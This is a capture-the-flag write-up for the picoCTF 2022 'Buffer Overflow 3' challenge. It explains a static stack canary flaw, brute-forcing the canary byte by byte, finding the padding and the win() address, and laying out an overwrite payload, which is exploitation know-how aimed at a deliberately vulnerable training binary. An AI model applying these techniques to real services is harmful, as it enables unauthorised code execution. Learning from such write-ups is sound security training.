# Buffer Overflow 3 — picoCTF 2022 (Writeup)

**Category:** Binary Exploitation
**Difficulty:** Hard
**Challenge authors:** Sanjay C / Palash Oswal
**Platform:** CyLab Security Academy / picoCTF 2022

---

## 1. Context

The challenge provides a `vuln` binary (32-bit, x86) protected by a **stack canary**, along with its source code `vuln.c`. The goal is to bypass this protection and redirect execution to the `win()` function, which prints the contents of `flag.txt`.

### Connecting to the service

```bash
nc saturn.picoctf.net <PORT>
```

---

## 2. Source code analysis (`vuln.c`)

Key points:

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE]; // canary read ONCE from canary.txt

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   ...
   read(0,buf,count);          // <-- overflow possible if count > BUFSIZE

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected *****\n");
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
}
```

**Main vulnerability: static canary.**
The canary is read only once at program startup from `canary.txt` and stays **identical across every connection**. It does not vary like a real canary randomly regenerated by ASLR on each execution. This makes it vulnerable to a **byte-by-byte brute-force attack**.

### Locating `win()`

```bash
objdump -d vuln | grep -A 2 "win"
```

```
08049336 <win>:
 8049336: f3 0f 1e fb    endbr32
 804933a: 55             pushl  %ebp
```

→ Target address: `0x08049336`

---

## 3. Exploitation strategy

### Step 1 — Brute-forcing the canary (byte by byte)

The canary is 4 bytes long (`CANARY_SIZE = 4`). For each byte (0 to 255):

1. Send a payload of `64 (buf) + already-found canary bytes + 1 byte being tested`.
2. If the server replies `Ok... Now Where's the Flag?` → the byte is correct.
3. If the server replies `***** Stack Smashing Detected *****` → wrong byte, try the next one.

Canary found: **`b"BiRd"`** (`0x42 0x69 0x52 0x64`).

### Step 2 — Determining the real EBP offset

The theoretical expected memory layout was:

```
[ 64 bytes buf ] [ 4 bytes canary ] [ 4 bytes EBP ] [ 4 bytes return address ]
```

But a test with `EBP_pad = 4` did not trigger `win()` (no crash, but no flag either). This is explained by the additional local variables (`length[64]`, `count`, `x`) and the memory alignment enforced by the compiler, which add padding between the canary and the actual return address.

**Solution:** automatically test several padding values (0, 4, 8, 12, 16, 20...).

### Step 3 — Building the final payload

```
payload = b"A" * 64        # fills buf
        + canary            # b"BiRd" (avoids Stack Smashing)
        + b"B" * EBP_PAD    # variable padding up to the return address
        + p32(0x08049336)   # address of win()
```

**Correct EBP padding found: 16 bytes.**

---

## 4. Result

```
pad=16 -> Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_********}
```

**Flag: `picoCTF{Stat1C_c4n4r13s_4R3_b4D_********}`** *(suffix masked, instance-specific flag)*

---

## 5. Lesson learned

The flag name sums up the flaw: *"Static canaries are bad"*. A stack canary must be **randomly regenerated on every program execution** (as GCC/glibc normally does via `/dev/urandom`). Here, since it is read only once from a static file and stays constant across all connections, it becomes trivially bypassable through brute-force, which completely defeats the purpose of the stack canary protection.

## 6. Tools used

- `pwntools` (Python) — automating connections and payload delivery
- `objdump` — disassembly to locate `win()`
- `nc` — manual connection testing

---

## 7. Resolution timeline

1. Analysis of the binary and source code (`vuln.c`)
2. Locating the address of `win()` via `objdump`
3. Setting up the Python environment (`venv` + `pwntools`)
4. Canary brute-force script, byte by byte (4 iterations, ~256 attempts max each)
5. First exploitation attempt with EBP padding = 4 bytes → silent failure
6. Automatic EBP padding sweep script (0 to 36, step 4)
7. Success with EBP padding = 16 bytes → flag obtained
